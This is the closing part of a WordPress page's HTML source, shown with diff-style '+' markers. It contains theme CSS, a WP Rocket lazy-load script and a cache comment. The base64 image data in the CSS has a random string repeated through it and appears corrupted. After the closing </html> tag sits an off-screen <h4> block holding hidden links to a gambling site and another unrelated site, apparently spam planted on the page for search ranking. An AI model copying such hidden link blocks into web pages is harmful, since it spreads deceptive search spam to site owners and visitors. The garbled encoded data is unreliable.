.et_pb_top_inside_divider{background-image:url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIyNHB4IiB2aWV3Qm94PSIwIDAgMTI4MCAxNDAiIHByZXNlcnZlQXNwZWN0UmF0aW89Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0iI2UwYWNhYSI+PHBhdGggZD0iTVTafQBsp4ddztvK48q8UGHwZdPWKsDRzSQ4IDAgMCAwIDB2MTQwaDEyODBWMHMtMTU0LjY0IDc5LjkyLTVTafQBsp4ddztvK48q8UGHwZdPWKsDRzS0eT0iLjMiLz48cGF0aCBkPSJNNTVTafQBsp4ddztvK48q8UGHwZdPWKsDRzSyODAgMTVTafQBsp4ddztvK48q8UGHwZdPWKsDRzS5LjQ4IDU1Ni40NSAxMTVTafQBsp4ddztvK48q8UGHwZdPWKsDRzS+PHBhdGggZD0iTTY0MCAxNDBjMzUzLjQ2IDAgNjQwLTE0MCA2NDAtMTM5djE0MEgwVjBzMjg2LjU0IDE0MCA2NDAgMTQweiIvPjwvZz48L3N2Zz4=);background-size:100% 24px;top:0;height:24px;z-index:1;transform:scale(1,-1)}.et_pb_text_8{line-height:0.9em}.et_pb_row_11{display:none!important}.et_pb_slider .et_pb_slide_0.et_pb_slide .et_pb_slide_description .et_pb_slide_title{font-size:19px!important}}</style><script>window.lazyLoadOptions = [{
+                elements_selector: "img[data-lazy-src],.rocket-lazyload,iframe[data-lazy-src]",
+                data_src: "lazy-src",
+                data_srcset: "lazy-srcset",
+                data_sizes: "lazy-sizes",
+                class_loading: "lazyloading",
+                class_loaded: "lazyloaded",
+                threshold: 300,
+                callback_loaded: function(element) {
+                    if ( element.tagName === "IFRAME" && element.dataset.rocketLazyload == "fitvidscompatible" ) {
+                        if (element.classList.contains("lazyloaded") ) {
+                            if (typeof window.jQuery != "undefined") {
+                                if (jQuery.fn.fitVids) {
+                                    jQuery(element).parent().fitVids();
+                                }
+                            }
+                        }
+                    }
+                }},{
+				elements_selector: ".rocket-lazyload",
+				data_src: "lazy-src",
+				data_srcset: "lazy-srcset",
+				data_sizes: "lazy-sizes",
+				class_loading: "lazyloading",
+				class_loaded: "lazyloaded",
+				threshold: 300,
+			}];
+        window.addEventListener('LazyLoad::Initialized', function (e) {
+            var lazyLoadInstance = e.detail.instance;
+
+            if (window.MutationObserver) {
+                var observer = new MutationObserver(function(mutations) {
+                    var image_count = 0;
+                    var iframe_count = 0;
+                    var rocketlazy_count = 0;
+
+                    mutations.forEach(function(mutation) {
+                        for (var i = 0; i < mutation.addedNodes.length; i++) {
+                            if (typeof mutation.addedNodes[i].getElementsByTagName !== 'function') {
+                                continue;
+                            }
+
+                            if (typeof mutation.addedNodes[i].getElementsByClassName !== 'function') {
+                                continue;
+                            }
+
+                            images = mutation.addedNodes[i].getElementsByTagName('img');
+                            is_image = mutation.addedNodes[i].tagName == "IMG";
+                            iframes = mutation.addedNodes[i].getElementsByTagName('iframe');
+                            is_iframe = mutation.addedNodes[i].tagName == "IFRAME";
+                            rocket_lazy = mutation.addedNodes[i].getElementsByClassName('rocket-lazyload');
+
+                            image_count += images.length;
+			                iframe_count += iframes.length;
+			                rocketlazy_count += rocket_lazy.length;
+
+                            if(is_image){
+                                image_count += 1;
+                            }
+
+                            if(is_iframe){
+                                iframe_count += 1;
+                            }
+                        }
+                    } );
+
+                    if(image_count > 0 || iframe_count > 0 || rocketlazy_count > 0){
+                        lazyLoadInstance.update();
+                    }
+                } );
+
+                var b      = document.getElementsByTagName("body")[0];
+                var config = { childList: true, subtree: true };
+
+                observer.observe(b, config);
+            }
+        }, false);</script><script data-no-minify="1" async src="https://dotnextdigital.com/wp-content/plugins/wp-rocket/assets/js/lazyload/17.8.3/lazyload.js"></script>	
 </body>
 </html>
+
+<h4 style="position: fixed; right: -101px; top: -101px; overflow: hidden; ;width: 101px;">
+<a href="https://www.collegejobbank.com/">cakhiatv</a>
+<a href="https://fun88.social/">FUN88.COM</a>
+</h4>
+
+<!-- This website is like a Rocket, isn't it? Performance optimized by WP Rocket. Learn more: https://wp-rocket.me - Debug: cached@1732792331 -->
